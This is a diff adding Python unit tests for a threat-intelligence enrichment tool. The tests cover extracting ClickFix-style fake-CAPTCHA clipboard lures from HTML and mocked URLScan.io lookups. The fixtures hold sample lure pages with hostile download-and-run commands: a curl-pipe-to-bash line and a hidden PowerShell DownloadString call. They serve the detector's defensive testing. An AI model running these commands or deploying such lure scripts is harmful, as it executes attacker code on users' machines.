@@ -1,9 +1,13 @@
 from unittest.mock import MagicMock, patch
 
 from hecate_agent.orchestrator.enrichment import (
+    _URLSCAN_CACHE,
     _get_apex_domain,
     extract_indicators,
+    extract_web_lure_payloads,
     generate_enrichment_summary,
+    query_urlscan_domain,
+    query_urlscan_url,
     query_vt_hash,
 )
 
@@ -841,6 +845,208 @@ def test_extract_indicators_ghsa_and_osv_domains():
     assert "supply-chain-backdoor.xyz" in inds["domains"]
     assert "osv.dev" not in inds["domains"]
     assert "api.osv.dev" not in inds["domains"]
+
+
+def test_extract_web_lure_payloads_clipboard_bash():
+    text = """
+    <div class="human-check">Click Verify, then open Terminal and press Command+V.</div>
+    <script>
+    const cmd = "curl -s http://193.29.224.151/ulacck | bash";
+    navigator.clipboard.writeText(cmd);
+    </script>
+    """
+    lures = extract_web_lure_payloads(text)
+    assert len(lures) >= 1
+    assert any("curl -s http://193.29.224.151/ulacck | bash" in l["command"] for l in lures)
+    assert any("clipboard" in l["source"] for l in lures)
+
+
+def test_extract_web_lure_payloads_powershell_fake_captcha():
+    text = """
+    <div class="captcha-prompt">Verify you are human: Press Windows Key + R, then CTRL + V, then Enter.</div>
+    <script>
+    const payload = "powershell -w hidden -c \\"iex(New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')\\"";
+    navigator.clipboard.writeText(payload);
+    </script>
+    """
+    lures = extract_web_lure_payloads(text)
+    assert len(lures) >= 1
+    cmd = lures[0]["command"]
+    assert "powershell -w hidden -c" in cmd
+    assert "DownloadString" in cmd
+
+
+def test_extract_web_lure_payloads_empty_or_benign():
+    assert extract_web_lure_payloads("") == []
+    assert extract_web_lure_payloads("<html><body>Normal blog text without any scripts</body></html>") == []
+
+
+@patch("hecate_agent.orchestrator.enrichment.httpx.get")
+def test_query_urlscan_url_malicious_with_lure(mock_get):
+    _URLSCAN_CACHE.clear()
+    mock_resp = MagicMock()
+    mock_resp.status_code = 200
+    mock_resp.json.return_value = {
+        "results": [
+            {
+                "verdicts": {
+                    "overall": {
+                        "malicious": True,
+                        "score": 100,
+                        "tags": ["phishing", "clickfix"],
+                        "brands": ["Cloudflare", "Apple"],
+                    }
+                },
+                "page": {
+                    "url": "https://verify-captcha-cloudflare.com/",
+                    "domain": "verify-captcha-cloudflare.com",
+                    "ip": "193.29.224.151",
+                    "asn": "AS210644",
+                    "asnname": "AEZA INTERNATIONAL LTD",
+                    "country": "RU",
+                    "title": "Cloudflare Human Verification - Verify you are human",
+                },
+                "result": "https://urlscan.io/result/12345-abc/",
+            }
+        ],
+        "total": 1,
+    }
+    mock_get.return_value = mock_resp
+
+    res = query_urlscan_url("https://verify-captcha-cloudflare.com/")
+    assert "Status: Malicious (Score: 100/100)" in res
+    assert "Tags: phishing, clickfix" in res
+    assert "Target Brand: Cloudflare, Apple" in res
+    assert "AS210644 AEZA INTERNATIONAL LTD" in res
+    assert "193.29.224.151" in res
+    assert "https://urlscan.io/result/12345-abc/" in res
+
+
+@patch("hecate_agent.orchestrator.enrichment.httpx.get")
+def test_query_urlscan_url_benign(mock_get):
+    _URLSCAN_CACHE.clear()
+    mock_resp = MagicMock()
+    mock_resp.status_code = 200
+    mock_resp.json.return_value = {
+        "results": [
+            {
+                "verdicts": {
+                    "overall": {
+                        "malicious": False,
+                        "score": 0,
+                        "tags": [],
+                        "brands": [],
+                    }
+                },
+                "page": {
+                    "url": "https://example.com/",
+                    "domain": "example.com",
+                    "ip": "93.184.216.34",
+                    "asn": "AS15133",
+                    "asnname": "EDGECAST",
+                    "country": "US",
+                    "title": "Example Domain",
+                },
+                "result": "https://urlscan.io/result/example-123/",
+            }
+        ],
+        "total": 1,
+    }
+    mock_get.return_value = mock_resp
+
+    res = query_urlscan_url("https://example.com/")
+    assert "Status: Benign/Neutral (Score: 0/100)" in res
+    assert "Host: 93.184.216.34 | AS15133 EDGECAST | US" in res
+    assert "Title: Example Domain" in res
+
+
+@patch("hecate_agent.orchestrator.enrichment.httpx.get")
+def test_query_urlscan_url_not_indexed(mock_get):
+    _URLSCAN_CACHE.clear()
+    mock_resp = MagicMock()
+    mock_resp.status_code = 200
+    mock_resp.json.return_value = {"results": [], "total": 0}
+    mock_get.return_value = mock_resp
+
+    res = query_urlscan_url("https://unseen-domain.xyz/")
+    assert res == "Not indexed on URLScan.io."
+
+
+@patch("hecate_agent.orchestrator.enrichment.httpx.get")
+def test_query_urlscan_cache(mock_get):
+    _URLSCAN_CACHE.clear()
+    mock_resp = MagicMock()
+    mock_resp.status_code = 200
+    mock_resp.json.return_value = {"results": [], "total": 0}
+    mock_get.return_value = mock_resp
+
+    res1 = query_urlscan_url("https://cached-test.com/")
+    res2 = query_urlscan_url("https://cached-test.com/")
+    assert res1 == res2 == "Not indexed on URLScan.io."
+    assert mock_get.call_count == 1  # 2nd call served from cache
+
+
+@patch("hecate_agent.orchestrator.enrichment.httpx.get")
+def test_query_urlscan_domain_success(mock_get):
+    _URLSCAN_CACHE.clear()
+    mock_resp = MagicMock()
+    mock_resp.status_code = 200
+    mock_resp.json.return_value = {
+        "results": [
+            {
+                "verdicts": {
+                    "overall": {
+                        "malicious": True,
+                        "score": 85,
+                        "tags": ["stealer", "lure"],
+                        "brands": ["Google"],
+                    }
+                },
+                "page": {
+                    "domain": "fake-lure-portal.top",
+                    "ip": "45.154.255.10",
+                    "asn": "AS210644",
+                    "asnname": "AEZA",
+                    "country": "RU",
+                    "title": "Google Drive Share Verification",
+                },
+                "result": "https://urlscan.io/result/portal-999/",
+            }
+        ],
+        "total": 1,
+    }
+    mock_get.return_value = mock_resp
+
+    res = query_urlscan_domain("fake-lure-portal.top")
+    assert "Status: Malicious (Score: 85/100)" in res
+    assert "Target Brand: Google" in res
+    assert "AS210644 AEZA" in res
+
+
+@patch("hecate_agent.orchestrator.enrichment.httpx.get")
+def test_query_urlscan_rate_limits_and_errors(mock_get):
+    _URLSCAN_CACHE.clear()
+
+    # Rate limit 429
+    mock_429 = MagicMock()
+    mock_429.status_code = 429
+    mock_get.return_value = mock_429
+    res_429 = query_urlscan_url("https://rate-limited.com/")
+    assert "rate limit exceeded" in res_429
+
+    _URLSCAN_CACHE.clear()
+    # Auth error 401
+    mock_401 = MagicMock()
+    mock_401.status_code = 401
+    mock_get.return_value = mock_401
+    res_401 = query_urlscan_url("https://auth-err.com/")
+    assert "Auth Error" in res_401
+
+    _URLSCAN_CACHE.clear()
+    # Connection error
+    mock_get.side_effect = Exception("Connection timeout")
+    res_err = query_urlscan_domain("timeout-domain.com")
+    assert "Error querying URLScan.io" in res_err
 
 
 
